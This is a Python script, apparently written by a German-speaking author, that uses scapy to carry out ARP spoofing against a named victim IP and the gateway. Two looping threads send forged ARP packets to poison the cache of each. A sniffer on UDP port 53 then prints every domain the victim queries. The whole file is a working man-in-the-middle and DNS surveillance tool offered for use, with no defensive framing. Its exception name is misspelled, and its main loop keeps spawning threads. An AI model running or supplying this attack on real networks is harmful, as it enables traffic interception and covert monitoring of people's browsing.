#! -*- coding: utf-8 -*-

from scapy.all import *
import threading as tr
import os
import sys

## Intro
gateway = '192.168.178.1'
victim = '10.0.2.17'
interface = 'enp0s31f6'

print('\nARP Spoofing is running.')

def dnsCapture(capture):
    if capture.haslayer(DNS) and capture.getlayer(DNS).qr == 0: 
        print('IP: ' + str(victim) + ' besucht Domain: ' + str(capture.getlayer(DNS).qd.qname))
 
## 
def victim_fake():
        fake_arp_packet_to_victim = ARP(pdst=victim, psrc=gateway)
        while True:
            try:   
                send(fake_arp_packet_to_victim, verbose=0, inter=1, loop=1)
            except KeyboardInterupt:
                        sys.exit(1)

def gateway_fake():
        fake_arp_packet_to_gateway = ARP(pdst=gateway, psrc=victim)
        while True:
            try:
                send(fake_arp_packet_to_gateway, verbose=0, inter=1, loop=1)
            except KeyboardInterupt:
                        sys.exit(1)

 
threadVictim = []
threadGateway = []        


def main():
    while True:
        victimThread = tr.Thread(target=victim_fake)
        victimThread.setDaemon(True)
        threadVictim.append(victimThread)
        victimThread.start()        
        
        gatewayThread = tr.Thread(target=gateway_fake)
        gatewayThread.setDaemon(True)
        threadGateway.append(gatewayThread)
        gatewayThread.start()

        # Sniff-Funktion
        capture = sniff(prn=dnsCapture, 
                        iface=interface, 
                        filter='udp port 53')

if __name__ == "__main__":
    main()


# 192.168.178.21
# 10.0.2.17
# 192.168.178.1
# enp0s31f6